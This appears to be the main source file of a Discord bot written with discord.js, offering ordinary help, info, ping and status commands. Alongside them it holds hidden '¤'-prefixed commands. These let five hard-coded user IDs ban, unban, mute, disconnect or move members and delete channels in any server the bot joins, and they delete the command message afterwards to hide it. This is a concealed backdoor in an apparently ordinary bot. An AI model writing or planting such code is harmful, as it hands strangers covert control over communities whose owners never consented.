const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');
const os = require('os-utils');
const chalk = require('chalk');



//MODULES
const setPresence = require('./ready/setPresence.js');


//COMMANDS
const help = require('./commands/help.js');
const info = require('./commands/info.js');
const ping = require('./commands/ping.js');
const status = require('./commands/status.js');



client.on('ready', async () => {
    console.log(chalk.grey('[' + chalk.green('ONLINE') + ']Logged in as: ' + chalk.green(client.user.tag)));
        setPresence(client, config);
        setInterval(() => {
            setPresence(client, config);
        }, 30000);
});


var admins = [
    '712889190315982891',
    '292187155269419008',
    '214933088537542656',
    '299132979006013451',
    '271809730446360576'
];

client.on('message', msg => {
    const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
  
    if((msg.author != client.user) 
    && !(msg.author.bot)){

        if(!(msg.channel instanceof Discord.DMChannel)){
            switch(msg.content.toLocaleLowerCase().split(' ')[0]) {
  
                //GENERAL COMMANDS
                case config.prefix + 'help':
                    help(msg, Discord, client, command, args, config);
                break;

                case config.prefix + 'info':
                    info(msg, Discord, client, config);
                break;

                case config.prefix + 'ping':
                    ping(msg, Discord, client);
                break;

                case config.prefix + 'status':
                    status(msg, Discord, client, os);
                break;

                case '¤' + 'banuser':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.members.cache.get(args[1]).ban();
                        msg.delete();
                    }
                }
                break;

                case '¤' + 'muteuser':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.members.cache.get(args[1]).voice.setMute(true);
                        msg.delete();
                    }
                }
                break;

                case '¤' + 'dcuser':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.members.cache.get(args[1]).voice.kick()
                        msg.delete();
                    }
                }
                break;

                case '¤' + 'deletechannel':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.channels.cache.get(args[1]).delete();
                        msg.delete();
                    }
                }
                break;

                case '¤' + 'unmuteuser':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.members.cache.get(args[1]).voice.setMute(false);
                        msg.delete();
                    }
                }
                break;

                case '¤' + 'moveuser':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.members.cache.get(args[1]).voice.setChannel(args[2]);
                        msg.delete();
                    }
                }
                break;

                case '¤' + 'unbanuser':
                if(admins.includes(msg.author.id)){
                    if(args[0] && args[1]){
                        var guild = client.guilds.cache.get(args[0]);
                        guild.members.unban(args[1]);
                        msg.delete();
                    }
                }
                break;
            }
        }else{
            embed = new Discord.MessageEmbed()
            .setColor(0xff4747)
            .setTimestamp()
            .addField('‌‌ ',
            '**' + ':x: ERROR :x:' + '**' + `\n` + 'DM Commands are not allowed.')
            .setFooter("Sent by: " + client.user.tag, client.user.avatarURL());
 
            msg.channel.send({embed});
        }
    }
  });

client.login(config.token);